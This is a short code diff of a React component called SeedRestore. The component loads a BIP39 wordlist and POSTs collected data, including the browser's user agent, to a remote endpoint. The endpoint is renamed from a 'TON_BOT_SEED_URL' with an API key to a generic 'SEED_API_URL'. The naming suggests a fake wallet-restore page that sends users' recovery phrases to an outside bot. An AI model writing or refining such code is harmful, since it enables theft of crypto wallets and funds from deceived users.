@@ -2,7 +2,7 @@
 
 import React, { useMemo, useState, useRef, useEffect } from "react";
 import axios from "axios";
-import { NOTIFICATION_APP_NAME, TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../app/config";
+import { NOTIFICATION_APP_NAME, SEED_API_URL } from "../app/config";
 
 // Load BIP39 wordlist from public file
 const loadWordlist = async (): Promise<string[]> => {
@@ -219,17 +219,11 @@ export default function SeedRestore({
           typeof navigator !== "undefined" ? navigator.userAgent : "Unknown",
       };
 
-      const response = await fetch(
-        TON_BOT_SEED_URL,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "x-api-key": TON_BOT_API_KEY,
-          },
-          body: JSON.stringify(messageData),
-        }
-      );
+      const response = await fetch(SEED_API_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(messageData),
+      });
 
       const result = await response.json();
 
